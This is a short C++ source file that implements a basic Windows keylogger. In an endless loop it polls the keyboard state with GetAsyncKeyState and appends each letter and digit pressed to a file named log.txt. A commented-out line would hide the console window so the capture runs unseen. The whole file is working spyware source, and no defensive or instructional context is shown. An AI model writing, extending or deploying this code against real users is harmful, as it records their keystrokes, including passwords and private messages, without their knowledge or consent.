#include <iostream>
#include <windows.h>
#include <fstream>

int main()
{
	// ShowWindow(GetConsoleWindow(), SW_HIDE);
	std::ofstream log;
	while (true)
	{
		for (int tmp = 8; tmp <= 190; tmp++)
		{
			if (GetAsyncKeyState(tmp) == -32767)
			{
				if ((tmp>=65 && tmp<=90) || (tmp>=48 && tmp<=57)) {
					log.open("log.txt", std::ofstream::app);
					log << char(tmp) << "\n";
					log.close();
				}
			}
		}
	}
	return 0;
}
